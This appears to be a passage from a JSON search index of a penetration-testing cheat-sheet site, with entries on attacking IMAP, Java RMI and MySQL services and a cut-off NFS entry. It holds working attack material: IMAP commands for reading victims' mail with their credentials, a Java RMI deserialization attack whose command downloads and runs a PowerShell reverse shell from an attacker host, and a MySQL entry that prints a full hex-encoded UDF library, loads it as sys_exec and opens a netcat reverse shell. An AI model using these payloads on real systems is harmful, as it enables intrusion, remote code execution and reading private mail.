						"content": "Internet Message Access Protocol (IMAP) In computing, the Internet Message Access Protocol (IMAP) is an Internet standard protocol used by email clients to retrieve email messages from a mail server over a TCP IP connection. IMAP is defined by RFC 3501. By default, the IMAP protocol works on two ports: Port 143 - this is the default IMAP non-encrypted port Port 993 - this is the port you need to use if you want to connect using IMAP securely Connection to IMAP server We can established our connection to both ports, non-encrypted or encypted. # Non-encrypted connection telnet imap.server.local 143 # Encrypted connection openssl s_client -crlf -connect imap.server.local:993 Login To take a look to victims mailboxes, we obviously need their creds. A1 LOGIN user@server.local password tag LOGIN user@server.local password Note: Sometimes the user does not contains the domain. List Mailboxes To list mailboxes run the following command. A1 LIST \"\" * tag LIST \"\" * Select a Mailbox After getting the existant mailboxes we need to choose one. A1 SELECT \"[INBOX]\" tag SELECT \"[INBOX]\" Mailbox status With status command, we can see the total of non-read messages, sent messages and more over. A1 STATUS \"[INBOX]\" (MESSAGES) tag STATUS \"[INBOX]\" (MESSAGES) Fetch headers of all messages Fetch command gives us the ability to read the messages. A1 FETCH 1:* (BODY[HEADER]) tag FETCH 1:* (BODY[HEADER]) Fetch message body To see the body of the message we need to set up the flag BODY as argument. #Non-multipart messages A1 FETCH [Message] (BODY) tag FETCH [Message] (BODY) #Multipart messages (Normaly plain text -&gt; n=1) A1 FETCH [Message] (BODY[n]) tag FETCH [Message] (BODY[n]) Logout Finally, when we finish out job we need to logout to close the connection. A1 LOGOUT tag LOGOUT References: https: tewarid.github.io 2011 05 10 access-imap-server-from-the-command-line-using-openssl.html https: book.hacktricks.xyz pentesting pentesting-imap"
					}

					
				
			
		
			
				
					,
					

					"services-java-rmi": {
						"id": "services-java-rmi",
						"title": "PORT 1100/tcp - Java RMI",
						"category": "",
						"url": " /services/java-rmi/",
						"content": "The Java Remote Method Invocation, or Java RMI, is a mechanism that allows an object that exists in one Java virtual machine to access and call methods that are contained in another one. Enumeration We can enumerate RMI ports with nmap. nmap -sV --script \"rmi-dumpregistry or rmi-vuln-classloader\" -p &lt;PORT&gt; &lt;IP&gt; &lt;PORT&gt; tcp open java-rmi Java RMI | rmi-dumpregistry: | creamtec ajaxswing JVMFactory | com.creamtec.ajaxswing.core.JVMFactory_Stub | @127.0.0.1:49157 | extends | java.rmi.server.RemoteStub | extends |_ java.rmi.server.RemoteObject BaRMIe.jar If we can dump the registry of the java-rmi instance is the case where the machine may be vulnerable to a deserialization exploit. To exploit this deserialization on RMI ports I’m going to use BaRMIe.jar. We can download the file on the following link. https: github.com NickstaDB BaRMIe releases download v1.01 BaRMIe_v1.01.jar You need to select some parameters such as target, attack, payload and OS command, here and example of usage with a nishang reverse shell. I used Apache Commons for payload but you can use one different. $ java -jar BaRMIe_v1.01.jar -attack &lt;IP&gt; &lt;PORT&gt; Target summary: &lt;IP&gt;:&lt;PORT&gt; Available attacks: [---] Java RMI registry illegal bind deserialization Target selection 1) &lt;IP&gt;:&lt;PORT&gt; Reliability [---], Deser attack [Y], payload [?] Select a target to attack (q to quit): 1 Available attacks for target: &lt;IP&gt;:&lt;PORT&gt; 1) [---] Java RMI registry illegal bind deserialization Select an attack to execute (b to back up, q to quit): 1 Attack: Java RMI registry illegal bind deserialization [---] Deserialization payloads for: &lt;IP&gt;:&lt;PORT&gt; 1) Apache Commons Collections 3.1, 3.2, 3.2.1 2) Apache Commons Collections 4.0-alpha1, 4.0 3) Apache Groovy 1.7-beta-1 to 2.4.0-beta-4 4) Apache Groovy 2.4.0-rc1 to 2.4.3 5) JBoss Interceptors API 6) ROME 0.5 to 1.0 7) ROME 1.5 to 1.7.3 8) Mozilla Rhino 1.7r2 9) Mozilla Rhino 1.7r2 for Java 1.4 10) Mozilla Rhino 1.7r3 11) Mozilla Rhino 1.7r3 for Java 1.4 12) Mozilla Rhino 1.7r4 and 1.7r5 13) Mozilla Rhino 1.7r6, 1.7r7, and 1.7.7.1 a) Try all available deserialization payloads Select a payload to use (b to back up, q to quit): 1 Enter an OS command to execute: powershell.exe -command \"IEX(new-object net.webclient).downloadstring('http: &lt;ip-kali&gt; Invoke-PowerShellTcp.ps1')\""
					}

					
				
			
		
			
				
					,
					

					"services-mysql": {
						"id": "services-mysql",
						"title": "PORT 3306/tcp - MySQL Server",
						"category": "",
						"url": " /services/mysql/",
						"content": "Syntax show databases; use database; show tables; select * from table; select column from table; select @@version; select user(); Privilege Escalation Once we have a database user, some configuration is needed to be checked. Grants Look what privileges have the user. show GRANTS; Variables Take a look to the defined variables, sometimes has valuable information. show VARIABLES; show VARIABLES LIKE '%version%'; show VARIABLES LIKE '%plugin_dir%'; show VARIABLES LIKE '%tmp%'; show VARIABLES LIKE '%hostname%'; RCE via Library (lib_mysqludf_sys.so) To do that task mysql root user is needed or another user with FILE permissions. Shellcode (@shell) 32 bits: x86 0x7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000 64 bits: x64 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 Exploitation Configurate the server with the following commands. set @shell = 0x7f454c46020101000000000000000000.....00000000; select @@plugin_dir; select binary @shell into dumpfile ' usr lib mysql plugin udf_sys_exec.so'; create function sys_exec returns int soname 'udf_sys_exec.so'; select * from mysql.func where name='sys_exec'; Execute code using the sys_exec function. select sys_exec('nc -e bin bash 10.10.10.10 443'); *https: www.exploit-db.com exploits 46249"
					}

					
				
			
		
			
				
					,
					

					"services-nfs": {
						"id": "services-nfs",
						"title": "PORT 2049/tcp - NFS",
						"category": "",
						"url": " /services/nfs/",
